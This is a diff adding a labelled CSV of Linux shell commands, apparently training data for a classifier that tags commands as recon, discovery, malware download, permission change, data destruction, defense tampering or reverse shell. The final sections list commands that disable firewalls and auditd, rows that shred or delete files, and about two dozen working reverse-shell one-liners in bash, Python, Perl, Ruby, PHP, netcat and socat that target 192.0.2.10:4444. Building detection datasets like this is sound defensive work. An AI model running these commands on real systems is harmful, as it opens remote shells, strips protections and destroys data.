@@ -1,0 +1,251 @@
+command,label
+pwd,Directory Recon
+pwd -P,Directory Recon
+ls,Directory Recon
+ls -la,Directory Recon
+ls -lah,Directory Recon
+ls -al /tmp,Directory Recon
+find . -maxdepth 2 -type d,Directory Recon
+find /home -type d,Directory Recon
+find /var -type d,Directory Recon
+tree,Directory Recon
+tree -L 2,Directory Recon
+tree -L 1,Directory Recon
+tree /tmp,Directory Recon
+echo $PWD,Directory Recon
+"printf '%s\n' ""$PWD""",Directory Recon
+dirs,Directory Recon
+pushd /tmp,Directory Recon
+popd,Directory Recon
+ls -d */,Directory Recon
+find . -type d -name '*.git',Directory Recon
+find /tmp -maxdepth 1 -type d,Directory Recon
+du -sh .,Directory Recon
+du -sh /tmp,Directory Recon
+ls /etc,Directory Recon
+find . -maxdepth 1 -type d,Directory Recon
+echo hello,Generic Execution
+echo test,Generic Execution
+printf 'hello\n',Generic Execution
+printf 'test\n',Generic Execution
+date,Generic Execution
+date +%Y-%m-%d,Generic Execution
+clear,Generic Execution
+TRUE,Generic Execution
+FALSE,Generic Execution
+sleep 1,Generic Execution
+sleep 2,Generic Execution
+printf '%s' ok,Generic Execution
+echo done,Generic Execution
+echo status,Generic Execution
+echo test123,Generic Execution
+printf 'sample',Generic Execution
+true && echo done,Generic Execution
+false || echo fallback,Generic Execution
+sleep 0,Generic Execution
+echo hello world,Generic Execution
+printf 'training sample\n',Generic Execution
+echo completed,Generic Execution
+date -u,Generic Execution
+printf '%d\n' 10,Generic Execution
+reset,Generic Execution
+who,Account Discovery
+who -a,Account Discovery
+who -q,Account Discovery
+w,Account Discovery
+w -h,Account Discovery
+users,Account Discovery
+whoami,Account Discovery
+id,Account Discovery
+id root,Account Discovery
+groups,Account Discovery
+groups $USER,Account Discovery
+last,Account Discovery
+last -n 5,Account Discovery
+lastlog,Account Discovery
+getent passwd,Account Discovery
+getent passwd root,Account Discovery
+getent group,Account Discovery
+getent group sudo,Account Discovery
+getent group adm,Account Discovery
+cat /etc/passwd,Account Discovery
+cat /etc/group,Account Discovery
+compgen -u,Account Discovery
+compgen -g,Account Discovery
+cut -d: -f1 /etc/passwd,Account Discovery
+awk -F: '{print $1}' /etc/passwd,Account Discovery
+uname,System Discovery
+uname -a,System Discovery
+uname -r,System Discovery
+uname -m,System Discovery
+hostname,System Discovery
+hostname -f,System Discovery
+hostnamectl,System Discovery
+uptime,System Discovery
+uptime -p,System Discovery
+lscpu,System Discovery
+lsblk,System Discovery
+free -h,System Discovery
+free -m,System Discovery
+df -h,System Discovery
+df -T,System Discovery
+df -i,System Discovery
+cat /etc/os-release,System Discovery
+cat /proc/version,System Discovery
+cat /proc/cpuinfo,System Discovery
+cat /proc/meminfo,System Discovery
+vmstat,System Discovery
+arch,System Discovery
+nproc,System Discovery
+nproc --all,System Discovery
+lsb_release -a,System Discovery
+ip addr,System Network Discovery
+ip a,System Network Discovery
+ip link,System Network Discovery
+ip route,System Network Discovery
+ip neigh,System Network Discovery
+ifconfig,System Network Discovery
+ifconfig -a,System Network Discovery
+ifconfig eth0,System Network Discovery
+route -n,System Network Discovery
+ss -tuln,System Network Discovery
+ss -tunap,System Network Discovery
+netstat -tuln,System Network Discovery
+netstat -rn,System Network Discovery
+arp -a,System Network Discovery
+arp -n,System Network Discovery
+cat /etc/resolv.conf,System Network Discovery
+cat /etc/hosts,System Network Discovery
+getent hosts localhost,System Network Discovery
+hostname -I,System Network Discovery
+ip -br addr,System Network Discovery
+ip -br link,System Network Discovery
+ip route show,System Network Discovery
+ip neigh show,System Network Discovery
+ss -lnt,System Network Discovery
+ss -lun,System Network Discovery
+wget http://example.com/payload.sh,Malware Download
+wget https://example.com/file.bin,Malware Download
+curl -O https://example.com/file.sh,Malware Download
+curl -o /tmp/file.bin https://example.com/file.bin,Malware Download
+wget -q http://example.com/archive.tar.gz,Malware Download
+curl -L https://example.com/payload,Malware Download
+wget http://example.com/update.bin,Malware Download
+curl -fsSL https://example.com/script.sh,Malware Download
+wget -O /tmp/sample.bin https://example.com/sample.bin,Malware Download
+curl -o /tmp/archive.tar.gz http://example.com/archive.tar.gz,Malware Download
+wget https://example.org/tool.zip,Malware Download
+curl -L -o /tmp/tool.zip https://example.org/tool.zip,Malware Download
+wget --no-check-certificate https://example.com/file,Malware Download
+curl -k https://example.com/payload.bin -o /tmp/payload.bin,Malware Download
+wget http://example.net/test.sh -O /tmp/test.sh,Malware Download
+curl http://example.net/test.bin -o /tmp/test.bin,Malware Download
+wget -qO /tmp/sample https://example.org/sample,Malware Download
+curl -sS https://example.org/file -o /tmp/file,Malware Download
+wget --content-disposition https://example.com/file.bin,Malware Download
+curl -O http://example.net/archive.zip,Malware Download
+wget https://example.com/a/b/c.bin,Malware Download
+curl -L http://example.com/download?id=1 -o /tmp/download.bin,Malware Download
+wget -O /tmp/script.sh http://example.org/script.sh,Malware Download
+curl -o /tmp/data.bin https://example.org/data.bin,Malware Download
+wget -q https://example.net/package.tar.gz,Malware Download
+chmod 600 file.txt,Permission Modification
+chmod 644 config.txt,Permission Modification
+chmod 755 script.sh,Permission Modification
+chmod +x script.sh,Permission Modification
+chmod -x script.sh,Permission Modification
+chmod 700 private.sh,Permission Modification
+chmod 777 shared.txt,Permission Modification
+chmod 640 secrets.txt,Permission Modification
+chmod 400 key.txt,Permission Modification
+chmod 664 report.txt,Permission Modification
+chmod u+x run.sh,Permission Modification
+chmod g+w file.txt,Permission Modification
+chmod o-r file.txt,Permission Modification
+chmod a+r file.txt,Permission Modification
+chmod u=rw file.txt,Permission Modification
+chmod 750 deploy.sh,Permission Modification
+chmod 751 service.sh,Permission Modification
+chmod 500 backup.sh,Permission Modification
+chmod 2755 shared_dir,Permission Modification
+chmod 1777 /tmp/example,Permission Modification
+chmod 755 /usr/local/bin/tool,Permission Modification
+chmod 600 ~/.config/example,Permission Modification
+chmod 644 README.txt,Permission Modification
+chmod 700 ~/.ssh/example,Permission Modification
+chmod 444 public.txt,Permission Modification
+rm file.txt,Data Destruction
+rm -f file.txt,Data Destruction
+rm -rf /tmp/testdir,Data Destruction
+rm -r old_directory,Data Destruction
+rm -rf /tmp/cache/*,Data Destruction
+shred file.txt,Data Destruction
+shred -u secret.txt,Data Destruction
+shred -n 3 sensitive.txt,Data Destruction
+truncate -s 0 logfile.txt,Data Destruction
+> logfile.txt,Data Destruction
+cat /dev/null > logfile.txt,Data Destruction
+dd if=/dev/zero of=/tmp/testfile bs=1M count=10,Data Destruction
+dd if=/dev/zero of=data.img bs=512 count=100,Data Destruction
+rm -f /tmp/temp1 /tmp/temp2,Data Destruction
+rm -rf build/,Data Destruction
+rm -rf cache/,Data Destruction
+rm old.log,Data Destruction
+rm -f *.tmp,Data Destruction
+shred -z -u secret.txt,Data Destruction
+truncate --size 0 history.log,Data Destruction
+rm -rf /tmp/session,Data Destruction
+rm -rf ./old_data,Data Destruction
+rm -f backup.tmp,Data Destruction
+shred -u credentials.txt,Data Destruction
+cat /dev/null > history.log,Data Destruction
+ufw disable,Defense Tampering
+ufw delete allow 22/tcp,Defense Tampering
+ufw reset,Defense Tampering
+iptables -F,Defense Tampering
+iptables -X,Defense Tampering
+iptables -t nat -F,Defense Tampering
+iptables -D INPUT -p tcp --dport 22 -j ACCEPT,Defense Tampering
+iptables -A INPUT -j DROP,Defense Tampering
+iptables -A OUTPUT -j DROP,Defense Tampering
+iptables -t nat -A POSTROUTING -j MASQUERADE,Defense Tampering
+systemctl stop firewalld,Defense Tampering
+systemctl disable firewalld,Defense Tampering
+systemctl stop ufw,Defense Tampering
+systemctl disable ufw,Defense Tampering
+service firewalld stop,Defense Tampering
+service ufw stop,Defense Tampering
+killall -9 auditd,Defense Tampering
+systemctl stop auditd,Defense Tampering
+systemctl disable auditd,Defense Tampering
+systemctl stop apparmor,Defense Tampering
+systemctl disable apparmor,Defense Tampering
+systemctl stop fail2ban,Defense Tampering
+systemctl disable fail2ban,Defense Tampering
+service fail2ban stop,Defense Tampering
+ufw deny 22/tcp,Defense Tampering
+bash -i >& /dev/tcp/192.0.2.10/4444 0>&1,Reverse Shell
+/bin/bash -i >& /dev/tcp/192.0.2.10/4444 0>&1,Reverse Shell
+sh -i >& /dev/tcp/192.0.2.10/4444 0>&1,Reverse Shell
+0<&196;exec 196<>/dev/tcp/192.0.2.10/4444; sh <&196 >&196 2>&196,Reverse Shell
+bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1',Reverse Shell
+"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((""192.0.2.10"",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",Reverse Shell
+"python -c 'import socket,os,pty;s=socket.socket();s.connect((""192.0.2.10"",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",Reverse Shell
+nc 192.0.2.10 4444 -e /bin/sh,Reverse Shell
+nc -e /bin/bash 192.0.2.10 4444,Reverse Shell
+ncat 192.0.2.10 4444 -e /bin/sh,Reverse Shell
+socat TCP:192.0.2.10:4444 EXEC:/bin/sh,Reverse Shell
+socat TCP:192.0.2.10:4444 EXEC:'/bin/bash -li',Reverse Shell
+"perl -e 'use Socket;$i=""192.0.2.10"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,""<&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",Reverse Shell
+"ruby -rsocket -e 'f=TCPSocket.open(""192.0.2.10"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",Reverse Shell
+"php -r '$s=fsockopen(""192.0.2.10"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",Reverse Shell
+busybox nc 192.0.2.10 4444 -e /bin/sh,Reverse Shell
+mkfifo /tmp/p; nc 192.0.2.10 4444 < /tmp/p | /bin/sh > /tmp/p,Reverse Shell
+telnet 192.0.2.10 4444 | /bin/sh | telnet 192.0.2.10 4445,Reverse Shell
+bash -c 'exec 5<>/dev/tcp/192.0.2.10/4444;cat <&5 | /bin/sh >&5 2>&5',Reverse Shell
+/bin/sh -c 'sh -i >& /dev/tcp/192.0.2.10/4444 0>&1',Reverse Shell
+"python3 -c 'import socket; s=socket.create_connection((""192.0.2.10"",4444)); s.send(b""shell\n"")'",Reverse Shell
+"perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""192.0.2.10"")));exec(""/bin/sh"")'",Reverse Shell
+"ruby -rsocket -e 'TCPSocket.new(""192.0.2.10"",4444)'",Reverse Shell
+ncat --udp 192.0.2.10 4444 -e /bin/sh,Reverse Shell
+"socat TCP:192.0.2.10:4444 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",Reverse Shell
